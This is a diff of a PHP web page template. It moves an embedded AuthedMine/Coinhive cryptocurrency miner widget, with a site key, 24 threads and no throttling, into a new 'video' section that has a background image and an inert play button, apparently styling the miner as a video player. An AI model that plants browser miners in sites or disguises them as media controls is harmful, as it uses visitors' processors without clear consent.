@@ -66,14 +66,13 @@ include("layout/c794bc6c9a3eccc2.php");
   }
 </script>
 -->
-
+<!--  video -->
 <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
-<section id="featured-post" class="featured-post-main-block">
-    <div class="container-fluid">
-      <div class="featured-post-main blog-post-single">
-        <div class="row">
-          <div class="post-single-img">        
-            <div class="coinhive-miner" 
+  <section id="video" class="video-main-block text-center">
+    <div class="container">
+      <div class="video-block">
+        <div class="video-item video-item-one">
+          <div class="coinhive-miner" 
               style="height: 100%;width: 100%"
               data-key="dmQTh9BimGpFmAdq4RUPFgUfjH0SYIt2"
               data-autostart="false"
@@ -85,13 +84,22 @@ include("layout/c794bc6c9a3eccc2.php");
               data-threads="24"
               data-throttle="0">
               <em>Loading...</em>
+          </div>
+          <div class="video-device">
+            <img class="bg_img img-responsive" src="images/bg/video-bg.jpg" alt="video-bg" />
+            <div class="overlay-bg"></div>
+            <div class="video-preview video-preview-one">
+              <div class="video-btn-two">
+                <a href="javascript:void(0);" class="btn-video-play-two"><i class="fa fa-play"></i></a>
+              </div>
             </div>
           </div>
         </div>
-       </div>
-       <div class="mr-lg-auto"></div>
       </div>
+    </div>
   </section>
+<!--  end video -->
+
 <!-- miner end -->
 <!--  footer -->
   <footer id="footer" class="footer-main-block">
